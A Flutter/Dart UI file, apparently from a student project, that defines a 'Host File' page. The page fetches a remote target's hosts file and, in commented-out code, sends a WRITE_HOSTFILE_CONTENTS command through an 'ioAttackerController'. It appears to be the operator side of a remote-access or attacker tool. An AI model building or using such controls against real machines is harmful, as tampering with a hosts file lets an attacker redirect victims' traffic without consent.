import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/res/constants.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';
import 'package:inferno_core_fyp/res/widgets/button%20components/my_text_btn.dart';
import 'package:inferno_core_fyp/res/widgets/input%20field%20components/big_input_field.dart';
import 'package:inferno_core_fyp/utils/utils.dart';
import 'package:inferno_core_fyp/view%20models/controllers/general_controller.dart';

class HostFilePage extends StatelessWidget {
  final String targetId;

  const HostFilePage({super.key, required this.targetId});

  @override
  Widget build(BuildContext context) {
    GeneralController generalController = Get.put(GeneralController());
    // final ioAttackerController  = IoAttackerController();
    return Scaffold(
      appBar: AppBar(title: const Text("Host File"), centerTitle: true),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        child: Padding(
          padding: const EdgeInsets.all(kDefaultPadding),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.end,
            children: [
              BigInputField(
                height: Get.height*.44,
                hintText: "...Host file...",
                textColor: blackColor,
                controller: generalController.generalController.value,
              ),
              20.ph,
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  MyTextButton(
                    text: "Get Host File",
                    onPressed: (){
                      generalController.getHostFile(targetId);
                    },
                    width: 125,
                  ),
                  MyTextButton(
                    text: "Confirm",
                    onPressed: (){
                      Utils.toastMsg("function implemented but commented out");
                      // if (generalController
                      //     .generalController.value.text !=
                      //     "") {
                      //   ioAttackerController.submitCommand(
                      //     targetId: widget.targetId,
                      //     data: {
                      //       "text": 'WRITE_HOSTFILE_CONTENTS',
                      //       "command_args": {
                      //         "data": generalController
                      //             .generalController.value.text
                      //             .trim()
                      //       },
                      //     },
                      //   );
                      // }
                    },
                    width: 100,
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}
